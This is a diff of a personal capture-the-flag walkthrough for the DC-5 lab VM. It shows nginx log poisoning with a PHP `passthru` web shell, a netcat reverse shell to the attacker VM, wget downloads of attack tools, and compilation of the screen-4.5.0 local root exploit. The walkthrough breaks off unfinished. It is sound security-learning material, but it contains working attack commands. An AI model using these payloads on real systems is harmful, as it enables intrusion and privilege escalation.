@@ -35,13 +35,53 @@ By DCAU
 * I accessed `http://10.0.2.11/testing-out-that-i-am-able-to-read-the-access-logs`, just to test out what we know about the access logs - that these files record all requests processed by the server:
 ![](/screenshots/dc-5/nginxAccessLogTest.jpg)
 * Note: The latest records are found at the bottom of the log file.
-* Next, run `nc 10.0.2.11 80`, then enter `GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1`.
+* Next, run `nc 10.0.2.11 80`, then enter `GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1`:
+![](/screenshots/dc-5/emptyGETresponse.jpg)
+* Note: I did not get back any response from my GET request, as compared to the walkthroughs by others who solved this challenge. They got back a response with status code `400 Bad Request`, where if you were to see the status code of my 'empty' GET request below, it is a `408 Request Timeut` error. Interesting.
 * `passthru` allows us to execute an external program and display its raw output.
 * Note: The browswer is not used to send this GET request because it will URL-encode the request, making it useless.
-* Refresh the page, i.e. run `http://10.0.2.11/thankyou.php?file=/var/log/nginx/access.log` and we see that there is an 'empty' GET request, which is really the request made when we executed the PHP code:
+* Refresh the page, i.e. visit `http://10.0.2.11/thankyou.php?file=/var/log/nginx/access.log` and we see that there is an 'empty' GET request, which is really the request made when we executed the PHP code:
 ![](/screenshots/dc-5/emptyGetRequest.jpg)
-* After that, run `http://10.0.2.11/thankyou.php?file=/var/log/nginx/access.log&cmd=id` and refresh the page to confirm that we are able to run commands. We should expect to see the output of running `id` in the access logs, exactly at the log entry where our 'empty' GET request was made:
+* After that, visit `http://10.0.2.11/thankyou.php?file=/var/log/nginx/access.log&cmd=id` to confirm that we are able to run commands. We should expect to see the output of running `id` in the access logs, exactly at the log entry where our 'empty' GET request was made:
 ![](/screenshots/dc-5/commandExecutionAccessLogs.jpg)
+* Note: Visiting the page with the parameter `cmd=id` immediately after sending the GET request via netcat will result in the output of `id` being displayed as the latest one. I visited a few pages in between for the example above to illustrate my point that the output of the command will only appear exactly where the netcat GET request was made.
+![](/screenshots/dc-5/commandExecutionImmediateAccessLogs.jpg)
+* Next, we will establish our shell to the web server by running a netcat listener `nc -v -l -p 1234` on our Kali VM terminal, and then visiting `http://10.0.2.11/thankyou.php?file=/var/log/nginx/access.log&cmd=nc 10.0.2.4 1234 -c /bin/sh` on our browser:
+![](/screenshots/dc-5/ncEstablishShell.jpg)
+* Note: Replace `10.0.2.4` with the IP address of your Kali VM, `1234` with a port number of your choice just for the purpose of establishing this connection, and `/bin/sh` with `/bin/bash` if you would like (there is no difference between the 2 here).
+* As expected, we are user `www-data` and it is time to find a way to escalate our privileges!
+* Before we do so, run `python -c 'import pty; pty.spawn("/bin/bash")'` to spawn our interactive TTY shell.
+* Next, run `find / -user root -perm -4000 -print 2>/dev/null` to search for setuid binaries which we can possibly exploit:
+![](/screenshots/dc-5/setuidBinaries.jpg)
+* Having executed this `find` command many times over our past challenges, we are more or less able to distinguish if there are any unusual binaries in the output. Here, it is `/bin/screen-4.5.0`.
+* Googling about /bin/screen-4.5.0 led me to find out about the existence of 2 exploits relating to it on Exploit DB - 41152 and 41154. I could not quite understand the former, so we will use the latter.
+* To upload the exploit script, run `python -m SimpleHTTPServer 4567` on our Kali VM, then navigate to `/tmp` on our netcat shell before running `wget http://10.0.2.4:4567/41154.sh`:
+![](/screenshots/dc-5/uploadExploitScript.jpg)
+* Note: According to [Python For Beginners](https://www.pythonforbeginners.com/modules-in-python/how-to-use-simplehttpserver/), the SimpleHTTPServer module that comes with Python is a simple HTTP server that provides standard GET and HEAD request handlers. An advantage with the built-in HTTP server is that we do not have to install and configure anything.
+* Note: `4567` is also a port number of your choice just for the purpose of establishing this connection.
+* Once it has been downloaded to the web server /tmp directory, `chmod +x 41154.sh` to give it executable permissions.
+* Running `./41154.sh` results in an error as shown in the boxed-up area:
+![](/screenshots/dc-5/failedScreenExploit.jpg)
+* Perhaps the exploit script could not be executed in one shot. Let us try to split the original script into its respective files by ourselves, and do the compilation manually.
+* First, we will do a quick analysis of the original exploit script:
+![](/screenshots/dc-5/exploitCode.jpg)
+* In summary, the original exploit script is split into 3 files - 2 .c files and 1 script.
+* We will next compile the 2 respective .c files, bearing in mind that the `/tmp` parts of the command (as indicated in the original exploit script) are removed because my version of files are stored in `/root`.
+* Compile `libhax.c` using the command `gcc -fPIC -shared -ldl -o libhax.so libhax.c`:
+![](/screenshots/dc-5/libhaxCompilation.jpg)
+* Compile `rootshell.c` using the command `gcc -o rootshell rootshell.c`:
+![](/screenshots/dc-5/rootshellCompilation.jpg)
+* We will name our script `screenroot.sh`, although you can name it otherwise. This name is the file name of the original exploit script.
+![](/screenshots/dc-5/screenRootScriptModified.jpg)
+* Time to upload all 3 files to the vulnerable web server:
+1. `wget http://10.0.2.4:4567/libhax.so`
+2. `wget http://10.0.2.4:4567/rootshell`
+3. `wget http://10.0.2.4:4567/screenroot.sh`
+![](/screenshots/dc-5/uploadExploitFiles.jpg)
+* The status code `200 OK` tells us that the upload is successful.
+* `chmod +x screenroot.sh` to give it executable permissions:
+![](/screenshots/dc-5/filesInTmpDirectory.jpg)
+* To-be-continued...
 
 # Other walkthroughs visited
 1. https://bzyo.github.io/dc-5/
